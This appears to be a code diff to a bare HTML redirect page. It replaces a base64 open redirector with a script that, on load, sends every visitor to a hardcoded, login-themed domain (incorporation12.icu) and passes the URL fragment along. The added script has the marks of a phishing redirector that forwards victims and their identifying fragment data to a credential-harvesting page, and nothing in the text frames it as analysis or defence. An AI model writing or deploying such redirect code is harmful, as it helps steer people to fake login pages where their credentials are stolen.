@@ -3,34 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+ 
     <script>
-        function redirectToDecodedUrl() {
-            // Get the query string from the URL
-            const queryString = window.location.search;
-            // Parse the query string to get the value of 'url'
-            const urlParams = new URLSearchParams(queryString);
-            const encodedUrl = urlParams.get('url');
-
-            if (encodedUrl) {
-                // Decode the base64-encoded URL
-                const decodedUrl = atob(encodedUrl);
-
-                // Redirect to the decoded URL after 1 second
-                setTimeout(() => {
-                    window.location.href = decodedUrl;
-                }, 1000); // 1000 milliseconds = 1 second
+        window.onload = function() {
+            // Capture the fragment (everything after '#')
+            var urlFragment = window.location.hash;
+            
+            // Define the target URL
+            var targetUrl = "https://login.incorporation12.icu/GEdDyyBx"; // Change this to the desired target domain
+            
+            // If the URL fragment exists, append it to the target URL and redirect
+            if (urlFragment) {
+                window.location.href = targetUrl + urlFragment;
             } else {
-                // If 'url' parameter is not present, show an error message
-                document.body.innerHTML = "<h1>Error: 'url' parameter is missing.</h1>";
+                // If no fragment, just redirect to the target domain (without the fragment)
+                window.location.href = targetUrl;
             }
-        }
-        
-        // Call the function when the script loads
-        window.onload = redirectToDecodedUrl;
+        };
     </script>
 </head>
 <body>
-
+     
 </body>
 </html>
